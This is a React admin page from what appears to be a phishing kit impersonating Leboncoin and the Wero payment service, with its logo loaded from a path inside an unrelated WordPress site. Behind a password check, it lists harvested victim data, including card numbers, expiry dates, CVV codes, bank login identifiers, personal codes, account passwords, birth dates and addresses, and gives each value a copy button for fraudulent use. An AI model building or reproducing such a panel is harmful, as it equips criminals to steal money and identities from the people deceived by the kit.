
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { User, FileText, Trash2, LogOut, Copy, Edit, RefreshCw } from "lucide-react";
import { getAllUsersData, deleteUserByEmail, checkAdminPassword } from "@/utils/sessionUtils";
import { cn } from "@/lib/utils";
import { toast } from "@/components/ui/use-toast";

interface UserData {
  email?: string;
  password?: string;
  nom?: string;
  prenom?: string;
  dateNaissance?: string;
  adresse?: string;
  codePostal?: string;
  ville?: string;
  telephone?: string;
  numeroCarte?: string;
  dateExpiration?: string;
  cryptogramme?: string;
  typeBanque?: string;
  identifiantBancaire?: string;
  codePersonnel?: string;
  montant?: string;
  code?: string;
  derniereMaj?: string;
}

const Admin: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [password, setPassword] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [usersData, setUsersData] = useState<UserData[]>([]);
  const [expandedUser, setExpandedUser] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const navigate = useNavigate();

  useEffect(() => {
    if (isAuthenticated) {
      loadUserData();
    }
  }, [isAuthenticated]);

  const loadUserData = async () => {
    setIsLoading(true);
    try {
      const data = await getAllUsersData();
      setUsersData(data);
      console.log("Données utilisateurs chargées:", data);
      toast({
        title: "Succès",
        description: `${data.length} utilisateurs chargés`,
        variant: "default",
      });
    } catch (error) {
      console.error("Erreur lors du chargement des données:", error);
      toast({
        title: "Erreur",
        description: "Impossible de charger les données utilisateurs",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (checkAdminPassword(password)) {
      setIsAuthenticated(true);
      setError("");
      toast({
        title: "Connexion réussie",
        description: "Bienvenue dans le panneau d'administration",
        variant: "default",
      });
    } else {
      setError("Mot de passe incorrect");
      toast({
        title: "Erreur",
        description: "Mot de passe incorrect",
        variant: "destructive",
      });
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
    toast({
      title: "Déconnexion",
      description: "Vous avez été déconnecté",
      variant: "default",
    });
  };

  const handleDelete = async (email: string) => {
    if (window.confirm("Êtes-vous sûr de vouloir supprimer cet utilisateur ?")) {
      setIsLoading(true);
      try {
        await deleteUserByEmail(email);
        await loadUserData();
        toast({
          title: "Succès",
          description: "Utilisateur supprimé avec succès",
          variant: "default",
        });
      } catch (error) {
        console.error("Erreur lors de la suppression:", error);
        toast({
          title: "Erreur",
          description: "Impossible de supprimer l'utilisateur",
          variant: "destructive",
        });
      } finally {
        setIsLoading(false);
      }
    }
  };

  const toggleExpand = (email: string) => {
    if (expandedUser === email) {
      setExpandedUser(null);
    } else {
      setExpandedUser(email);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copié",
      description: "Texte copié dans le presse-papier",
      variant: "default",
    });
  };

  const filteredUsers = usersData.filter(user => {
    const searchFields = [
      user.nom,
      user.prenom,
      user.email,
      user.telephone,
      user.adresse,
      user.ville,
      user.numeroCarte,
      user.code
    ].filter(Boolean).join(" ").toLowerCase();
    
    return searchFields.includes(searchTerm.toLowerCase());
  });

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex flex-col bg-gray-100">
        <div className="flex-1 flex items-center justify-center">
          <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-lg">
            <div className="flex justify-center mb-6">
              <img src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" alt="Leboncoin" className="h-10" />
            </div>
            <h1 className="text-2xl font-bold text-center mb-6">Connexion Administrateur</h1>
            
            <form onSubmit={handleLogin} className="space-y-6">
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                  Mot de passe
                </label>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-leboncoin-orange"
                  required
                />
              </div>
              
              {error && (
                <div className="text-red-500 text-sm">{error}</div>
              )}
              
              <button
                type="submit"
                className="w-full py-2 px-4 bg-[#F56B2A] text-white font-semibold rounded-md hover:bg-orange-600 focus:outline-none focus:ring-2 focus:ring-orange-400"
              >
                Se connecter
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5]">
      <header className="bg-white p-4 shadow-md">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center">
            <img src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" alt="Leboncoin" className="h-8 mr-2" />
            <h1 className="text-xl font-bold">Panneau d'administration</h1>
          </div>
          <div className="flex gap-2">
            <button
              onClick={loadUserData}
              className="flex items-center gap-1 px-3 py-1.5 bg-blue-500 text-white rounded hover:bg-blue-600"
              disabled={isLoading}
            >
              <RefreshCw size={16} className={isLoading ? "animate-spin" : ""} />
              Actualiser
            </button>
            <button
              onClick={handleLogout}
              className="flex items-center gap-1 px-3 py-1.5 bg-red-500 text-white rounded hover:bg-red-600"
            >
              <LogOut size={16} />
              Déconnexion
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto py-6 px-4">
        <div className="bg-white rounded-lg p-6 shadow-md">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold text-[#F56B2A]">Données Utilisateurs WERO</h2>
            <div className="flex gap-4">
              <div className="relative">
                <input
                  type="text"
                  placeholder="Rechercher..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 pr-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#F56B2A]"
                />
                <div className="absolute left-3 top-2.5 text-gray-400">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="11" cy="11" r="8"></circle>
                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                  </svg>
                </div>
              </div>
            </div>
          </div>

          {isLoading ? (
            <div className="text-center py-8">
              <div className="inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-[#F56B2A]"></div>
              <p className="mt-2 text-gray-600">Chargement des données...</p>
            </div>
          ) : (
            <div className="space-y-6">
              {filteredUsers.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  Aucun utilisateur trouvé
                </div>
              ) : (
                filteredUsers.map((user, index) => (
                  <div key={index} className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
                    <div className="p-4 border-b">
                      <div className="flex justify-between items-start">
                        <div>
                          <h3 className="text-xl font-semibold text-[#F56B2A]">
                            {user.nom || 'N/A'} {user.prenom || 'N/A'}
                          </h3>
                          <div className="text-sm text-gray-600 mt-1">
                            <p className="mb-1">Email: <span className="font-medium">{user.email || 'N/A'}</span></p>
                            <p className="mb-1">Code: <span className="font-medium">{user.code || 'N/A'}</span></p>
                            <p className="mb-1 text-green-500 font-medium">Montant: {user.montant || 'N/A'}</p>
                            <p className="mb-1">Téléphone: <span className="font-medium">{user.telephone || 'N/A'}</span></p>
                            <p className="mb-1">Dernière modification: <span className="font-medium">{user.derniereMaj || 'N/A'}</span></p>
                          </div>
                        </div>
                        <div className="flex gap-2">
                          <button 
                            onClick={() => toggleExpand(user.email || '')}
                            className="p-2 bg-blue-100 text-blue-600 rounded hover:bg-blue-200"
                            title="Voir détails"
                          >
                            <FileText size={16} />
                          </button>
                          <button 
                            onClick={() => handleDelete(user.email || '')}
                            className="p-2 bg-red-100 text-red-600 rounded hover:bg-red-200"
                            title="Supprimer"
                          >
                            <Trash2 size={16} />
                          </button>
                        </div>
                      </div>
                    </div>

                    {expandedUser === user.email && (
                      <div className="p-4 bg-gray-50">
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                          <div className="space-y-4">
                            <div>
                              <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                                <User size={18} className="mr-2 text-[#F56B2A]" />
                                Informations bancaires
                              </h4>
                              <div className="bg-white p-3 rounded-md border border-gray-200 shadow-sm">
                                <div className="space-y-2">
                                  {[
                                    { label: 'Titulaire', value: `${user.nom || 'N/A'} ${user.prenom || 'N/A'}` },
                                    { label: 'Numéro de carte', value: user.numeroCarte },
                                    { label: 'Expiration', value: user.dateExpiration },
                                    { label: 'CVV', value: user.cryptogramme },
                                    { label: 'Type de banque', value: user.typeBanque },
                                    { label: 'Identifiant bancaire', value: user.identifiantBancaire },
                                    { label: 'Code personnel', value: user.codePersonnel }
                                  ].map((item, idx) => (
                                    <div key={idx} className="flex justify-between text-sm border-b border-gray-100 pb-1 last:border-0 last:pb-0">
                                      <span className="text-gray-600">{item.label}:</span>
                                      <span className="font-medium flex items-center">
                                        {item.value || 'N/A'}
                                        {item.value && (
                                          <button 
                                            onClick={() => copyToClipboard(item.value || '')}
                                            className="ml-2 text-blue-500 hover:text-blue-700"
                                            title="Copier"
                                          >
                                            <Copy size={14} />
                                          </button>
                                        )}
                                      </span>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="space-y-4">
                            <div>
                              <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                                <User size={18} className="mr-2 text-[#F56B2A]" />
                                Informations personnelles
                              </h4>
                              <div className="bg-white p-3 rounded-md border border-gray-200 shadow-sm">
                                <div className="space-y-2">
                                  {[
                                    { label: 'Email', value: user.email },
                                    { label: 'Mot de passe', value: user.password },
                                    { label: 'Nom', value: user.nom },
                                    { label: 'Prénom', value: user.prenom },
                                    { label: 'Date de naissance', value: user.dateNaissance },
                                    { label: 'Adresse', value: user.adresse },
                                    { label: 'Code postal', value: user.codePostal },
                                    { label: 'Ville', value: user.ville },
                                    { label: 'Téléphone', value: user.telephone },
                                    { label: 'Montant', value: user.montant },
                                    { label: 'Code', value: user.code }
                                  ].map((item, idx) => (
                                    <div key={idx} className="flex justify-between text-sm border-b border-gray-100 pb-1 last:border-0 last:pb-0">
                                      <span className="text-gray-600">{item.label}:</span>
                                      <span className="font-medium flex items-center">
                                        {item.value || 'N/A'}
                                        {item.value && (
                                          <button 
                                            onClick={() => copyToClipboard(item.value || '')}
                                            className="ml-2 text-blue-500 hover:text-blue-700"
                                            title="Copier"
                                          >
                                            <Copy size={14} />
                                          </button>
                                        )}
                                      </span>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="mt-4 text-right">
                          <p className="text-xs text-gray-500">ID: {index + 1}</p>
                        </div>
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default Admin;
